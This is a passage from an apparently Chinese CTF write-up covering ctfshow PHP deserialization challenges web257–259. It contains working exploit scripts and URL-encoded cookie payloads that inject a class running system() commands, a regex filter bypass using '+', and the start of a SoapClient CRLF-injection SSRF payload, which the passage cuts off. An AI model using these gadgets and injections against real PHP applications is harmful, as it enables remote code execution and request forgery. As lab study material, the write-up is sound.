single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>‰ªé<code>backDoor</code>ÁöÑevalÂáΩÊï∞ÂÖ•ÊâãÔºå‰øÆÊîπ<code>ctfShowUser</code>ÁöÑclassÂèòÈáèËß¶ÂèëbackDoorÁ±ªÔºåËøõË°åÂëΩ‰ª§ÊâßË°å</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("cat flag.php");'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A21<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>ctfShowUser<span class="token operator">%</span><span class="token number">00</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>backDoor<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A23<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>cat<span class="token operator">+</span>flag<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:11:"ctfShowUser":4:&#123;s:21:"ctfShowUserusername";s:6:"xxxxxx";s:21:"ctfShowUserpassword";s:6:"xxxxxx";s:18:"ctfShowUserisVip";b:1;s:18:"ctfShowUserclass";O:8:"backDoor":1:&#123;s:14:"backDoorcode";s:23:"system("cat flag.php");";&#125;&#125;</span></code></pre><h4 id="web258-ÁªïËøáÊ≠£Âàô"><a href="#web258-ÁªïËøáÊ≠£Âàô" class="headerlink" title="web258(+ÁªïËøáÊ≠£Âàô)"></a>web258(+ÁªïËøáÊ≠£Âàô)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Â§ö‰∫ÜÊ≠£ÂàôËøáÊª§<code>/[oc]:\d+:/i</code> ËøòÊúâ‰∏™Â∞èÊîπÂä®Ôºå<strong>ÊääÂéüÊù•ÁöÑprivateÊîπÊàê‰∫Üpublic</strong></p><p>Ëøô‰∏™Ê≠£ÂàôË°®ËææÂºè<code>&#39;/[oc]:\d+:/i&#39;</code>ÂèØ‰ª•ÂàÜËß£‰∏∫Âá†‰∏™ÈÉ®ÂàÜÊù•Ëß£ÈáäÔºö</p><ol><li><code>/</code>ÔºöÊ≠£ÂàôË°®ËææÂºèÁöÑÂºÄÂßãÂíåÁªìÊùüÈÄöÂ∏∏‰ΩøÁî®ÊñúÊù†<code>/</code>Êù•Ê†áËÆ∞Ôºå‰ΩÜÂú®Â≠óÁ¨¶‰∏≤‰∏≠‰ΩøÁî®Êó∂ÔºåÈúÄË¶Å‰ΩøÁî®ËΩ¨‰πâÂ≠óÁ¨¶<code>\</code>Êù•ÈÅøÂÖç‰∏éÂ≠óÁ¨¶‰∏≤ÁöÑÁªìÊùüÊ†áËÆ∞Ê∑∑Ê∑Ü„ÄÇ</li><li><code>[oc]</code>ÔºöËøôÊòØ‰∏Ä‰∏™Â≠óÁ¨¶ÈõÜÔºåË°®Á§∫ÂåπÈÖçÊñπÊã¨Âè∑ÂÜÖÁöÑ‰ªªÊÑè‰∏Ä‰∏™Â≠óÁ¨¶„ÄÇÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåÂÆÉÂèØ‰ª•ÂåπÈÖçÂ≠óÊØç<code>o</code>Êàñ<code>c</code>„ÄÇ</li><li><code>:</code>ÔºöËøô‰∏™Â≠óÁ¨¶Â≠óÈù¢‰∏äË°®Á§∫ÂÆÉËá™Â∑±ÔºåÂç≥ÂÜíÂè∑„ÄÇ</li><li><code>\d+</code>Ôºö<code>\d</code>ÊòØ‰∏Ä‰∏™ÁâπÊÆäÂ≠óÁ¨¶Ôºå‰ª£Ë°®‰ªªÊÑè‰∏Ä‰∏™Êï∞Â≠óÔºà0-9Ôºâ„ÄÇ<code>+</code>ÊòØ‰∏Ä‰∏™ÈáèËØçÔºåË°®Á§∫ÂâçÈù¢ÁöÑÂ≠óÁ¨¶ÊàñÂ≠óÁ¨¶ÈõÜÂèØ‰ª•Âá∫Áé∞‰∏ÄÊ¨°ÊàñÂ§öÊ¨°„ÄÇÊâÄ‰ª•<code>\d+</code>Ë°®Á§∫ÂåπÈÖç‰∏Ä‰∏™ÊàñÂ§ö‰∏™Êï∞Â≠ó„ÄÇ</li><li><code>:</code>ÔºöÂêå‰∏äÔºåË°®Á§∫Â≠óÈù¢‰∏äÁöÑÂÜíÂè∑„ÄÇ</li><li><code>/i</code>Ôºö<code>i</code>ÊòØ‰∏Ä‰∏™‰øÆÈ•∞Á¨¶ÔºåË°®Á§∫‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô„ÄÇËøôÊÑèÂë≥ÁùÄ<code>[oc]</code>ÂèØ‰ª•ÂåπÈÖç<code>O</code>Êàñ<code>o</code>Êàñ<code>C</code>Êàñ<code>c</code>„ÄÇ</li></ol><p>Â∞ÜËøô‰∫õÈÉ®ÂàÜÁªÑÂêàËµ∑Êù•ÔºåËøô‰∏™Ê≠£ÂàôË°®ËææÂºèÂèØ‰ª•ÂåπÈÖçÂΩ¢Â¶Ç<code>/o123:</code>Êàñ<code>/c456:</code>ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂÖ∂‰∏≠<code>o</code>Êàñ<code>c</code>ÂêéÈù¢Ë∑üÁùÄ‰∏Ä‰∏™ÊàñÂ§ö‰∏™Êï∞Â≠óÔºåÁÑ∂ÂêéÊòØ‰∏Ä‰∏™ÂÜíÂè∑„ÄÇ‰æãÂ¶ÇÔºåÂÆÉÂèØ‰ª•ÂåπÈÖç<code>/oc:12345/</code>Êàñ<code>/O987:</code>„ÄÇ</p><p>ÂèØ‰ª•Âà©Áî®unserializeÁöÑÁâπÊÄßÂú®Êï∞Â≠óÂâçÈù¢Âä†‰∏ä <code>+</code> Âç≥ÂèØÔºåËøôÈáåÊ≠£ÂàôÊõøÊç¢‰∏Ä‰∏ã„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system("tac fl*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([oc]):(\d+:)/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$1</span></span>:+<span class="token interpolation"><span class="token variable">$2</span></span>"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> user<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span>fl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">// urlencode </span><span class="token comment">// O:+11:"ctfShowUser":1:&#123;s:5:"class";O:+8:"backDoor":1:&#123;s:4:"code";s:18:"system("tac fl*");";&#125;&#125;</span></code></pre><h4 id="web259-HTTP-SoapClient-CRLF-SSRF"><a href="#web259-HTTP-SoapClient-CRLF-SSRF" class="headerlink" title="web259(HTTP  SoapClient+CRLF+SSRF)"></a>web259(HTTP  SoapClient+CRLF+SSRF)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">.</span><span class="token class-name type-declaration">php</span><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Ê≤°ÊâæÂà∞ÂèØ‰ª•ÂèçÂ∫èÂàóÂåñÁöÑÁ±ªÔºå‰ΩÜÊòØÊ†πÊçÆÊèêÁ§∫‰º™ÈÄ†ipÂêéËÆøÈóÆflag.txtÂèØ‰ª•ÂæóÂà∞flagÔºåÊÑüËßâËÄÉÁöÑÊòØHTTP</p><p>Áúã‰∫ÜÂ§ß‰Ω¨wpËÄÉÁöÑÊòØphpÂéüÁîüÁ±ª<code>SoapClient</code>+<code>CRLF</code>ÂÆûÁé∞<code>SSRF</code></p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104">‰ªé‰∏ÄÈÅìÈ¢òÂ≠¶‰π†SoapClient‰∏éCRLFÁªÑÂêàÊã≥</a></p><p><strong>CRLFÊ≥®ÂÖ•ÊîªÂáª</strong></p><p>CRLFÊòØ‚ÄúÂõûËΩ¶+Êç¢Ë°å‚ÄùÔºà\r\nÔºâÁöÑÁÆÄÁß∞ÔºåÂÖ∂ÂçÅÂÖ≠ËøõÂà∂ÁºñÁ†ÅÂàÜÂà´‰∏∫0x0dÂíå0x0a„ÄÇÂú®HTTPÂçèËÆÆ‰∏≠ÔºåHTTP header‰∏éHTTP BodyÊòØÁî®‰∏§‰∏™CRLFÂàÜ</p><p>ÈöîÁöÑÔºåÊµèËßàÂô®Â∞±ÊòØÊ†πÊçÆËøô‰∏§‰∏™CRLFÊù•ÂèñÂá∫HTTPÂÜÖÂÆπÂπ∂ÊòæÁ§∫Âá∫Êù•„ÄÇÊâÄ‰ª•Ôºå‰∏ÄÊó¶Êàë‰ª¨ËÉΩÂ§üÊéßÂà∂HTTPÊ∂àÊÅØÂ§¥‰∏≠ÁöÑÂ≠óÁ¨¶ÔºåÊ≥®ÂÖ•‰∏Ä‰∫õÊÅ∂ÊÑèÁöÑÊç¢Ë°åÔºå</p><p>ËøôÊ†∑Êàë‰ª¨Â∞±ËÉΩÊ≥®ÂÖ•‰∏Ä‰∫õ‰ºöËØùCookieÊàñËÄÖHTML‰ª£Á†Å„ÄÇCRLFÊºèÊ¥ûÂ∏∏Âá∫Áé∞Âú®Location‰∏éSet-cookieÊ∂àÊÅØÂ§¥‰∏≠„ÄÇ</p><p><strong>Êú¨È¢òÈúÄË¶ÅÈáçÁÇπÂÖ≥Ê≥®ÁöÑÊûêÊûÑÂáΩÊï∞</strong></p><p><code>__call</code> Âú®ÂØπË±°‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™‰∏çÂèØËÆøÈóÆÊñπÊ≥ïÊó∂Ë∞ÉÁî®<br>Âú®ËøôÈÅìÈ¢ò‰∏≠<code>$vip-&gt;getFlag();</code>Âõ†‰∏∫Ë∞ÉÁî®‰∫ÜÁ±ª‰∏≠Ê≤°ÊúâÁöÑÊñπÊ≥ïÊâÄ‰ª•‰ºöÂØºËá¥<code>__call</code>ÁöÑÊâßË°å<br>Êú¨È¢òÈúÄË¶ÅÁî®Âà∞ÁöÑÂáΩÊï∞<br><a href="https://www.php.net/manual/zh/soapclient.call.php">SoapClient::__call</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=></span> <span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user_agent'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'hsad^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token 